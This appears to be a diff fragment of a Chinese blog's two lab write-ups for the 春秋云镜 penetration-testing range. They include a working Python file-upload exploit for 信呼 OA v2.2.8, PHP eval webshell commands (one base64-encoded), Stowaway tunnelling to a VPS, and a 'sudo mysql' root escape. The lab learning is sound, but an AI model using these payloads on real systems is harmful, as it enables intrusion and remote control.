+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure>
+
+<p>172.22.1.21：对应的主机名为 <code>XIAORANG-OA01</code>，存在MS17-010 漏洞</p>
+<p>172.22.1.2：DC域控</p>
+<p>172.22.1.18：信呼OA办公系统</p>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="使用Stowaway搭建隧道"><a href="#使用Stowaway搭建隧道" class="headerlink" title="使用Stowaway搭建隧道"></a>使用Stowaway搭建隧道</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309230505042.png" alt="image-20250309230505042"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309231411403.png" alt="image-20250309231411403"></p>
+<p>先上传一个linux_x64_agent到靶机然后777给权限</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309230615074.png" alt="image-20250309230615074"></p>
+<p>然后上传linux_x64_admin到自己的云服务器并给权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 12345 -s 654321</span><br></pre></td></tr></table></figure>
+
+<p>设置参数，设置监听端口为12345</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309231628694.png" alt="image-20250309231628694"></p>
+<p>然后靶机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_agent -c 123.56.166.154:12345 -s 654321 --reconnect 8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309231817679.png" alt="image-20250309231817679"></p>
+<p>成功搭建隧道</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 5555 //端口自定义</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309232238383.png" alt="image-20250309232238383"></p>
+<p>proxy插件配置代理ip为vps的ip然后端口为5555后访问</p>
+<h3 id="信呼协同办公系统v2-2-8文件上传漏洞"><a href="#信呼协同办公系统v2-2-8文件上传漏洞" class="headerlink" title="信呼协同办公系统v2.2.8文件上传漏洞"></a>信呼协同办公系统v2.2.8文件上传漏洞</h3><p>发现代理配置一直不是很稳定，直接看的师傅的wp去做了</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309232759051.png" alt="image-20250309232759051"></p>
+<p>弱口令admin&#x2F;admin123登录</p>
+<p>文件上传漏洞，直接exp一把梭</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;socks5://47.109.176.117:5555&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&lt;?php eval($_POST[&#x27;Infernity&#x27;]);&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">session.post(url1, data=data1, proxies=proxy)</span><br><span class="line">res = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;, proxies=proxy)</span><br><span class="line">os.remove(<span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(res.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = res.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">session.get(url3, proxies=proxy)</span><br><span class="line">res = session.post(url_pre + filepath,data=&#123;<span class="string">&quot;Infernity&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>得到上传木马的路径后访问文件然后用蚁剑连接</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309233225962.png" alt="image-20250309233225962"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image.png" alt="img"></p>
+<p>是Windows的服务器，直接终端找flag</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-1741534511133-29.png" alt="img"></p>
+<p>查看看到flag02的内容</p>
+<p>最后一个ms17-010永恒之蓝的漏洞，不过好像端口关了，msf打不进去， 就先做到这里吧</p>
+]]></content>
+      <categories>
+        <category>春秋云镜</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>春秋云镜初试</title>
+    <url>/2025/03/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%9D%E8%AF%95/</url>
+    <content><![CDATA[<p>第一个flag</p>
+<p>用fscan扫一下发现是thinkphp的rce</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124203704494.png" alt="image-20250124203704494"></p>
+<p>访问一下网址</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124204059960.png" alt="image-20250124204059960"></p>
+<p>扫目录</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124204131189.png" alt="image-20250124204131189"></p>
+<p>访问出来还是index.php</p>
+<p>直接看漏洞浮现就可以</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124204550931.png" alt="image-20250124204550931"></p>
+<p>抓包上传</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124205041006.png" alt="image-20250124205041006"></p>
+<p>id可以看到当前的用户信息，然后我们用pwd看一下当前目录</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124205417353.png" alt="image-20250124205417353"></p>
+<p>放蚁剑打好一点，往里面写个一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>然后ls看一下木马是否成功写入</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124205453216.png" alt="image-20250124205453216"></p>
+<p>看到写入了，用蚁剑连一下</p>
+<p>但是没连上，是被吃了吗？？？</p>
+<p>穿个phpifo的php文件试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; /var/www/html/test2.php</span><br></pre></td></tr></table></figure>
+
+<p>然后访问test2.php是可以出来的</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124210100299.png" alt="image-20250124210100299"></p>
+<p>应该是有什么被过滤了，我们用base64编码传进去试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot; | base64 -d &gt; /var/www/html/1.php</span><br></pre></td></tr></table></figure>
+
+<p>然后ls可以看到传进去了</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124210434966.png" alt="image-20250124210434966"></p>
+<p>用蚁剑终于可以连上了</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124210510943.png" alt="image-20250124210510943"></p>
+<p>找不到flag，可能在root里，试试提权。我们可以用插件，然后添加用户</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124211559048.png" alt="image-20250124211559048"></p>
+<p>然后终端输入sudo -l</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124211830447.png" alt="image-20250124211830447"></p>
+<p>说明我们可以通过sudo高权限运行mysql</p>
+<p>mysql 8.0以上有<code>system(\!)</code>可以执行系统命令。</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124212106487.png" alt="image-20250124212106487"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>其中-e表示执行系统命令，感叹号!表示开始执行系统命令，由于在bash语句中的感叹号!表示访问历史记录，因此要对感叹号!使用反斜杠\进行转义。</p>
+<p>然后我们顺着cat就能拿到第一个flag了</p>
+<p>第二个flag</p>
+<p>通过ip -a去查看网段</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124212600129.png" alt="image-20250124212600129"></p>
+<p>可以看到是172.22.1.15&#x2F;16，拿fscan扫一下(注意是拿靶机的服务器)</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124213454997.png" alt="image-20250124213454997"></p>
+<p>我们fscan的结果会存到一个result.txt中</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/3110a474dc742d95d719da0c3f39bfdf.png" alt="3110a474dc742d95d719da0c3f39bfdf"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
+      <categories>
+        <category>春秋云镜</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
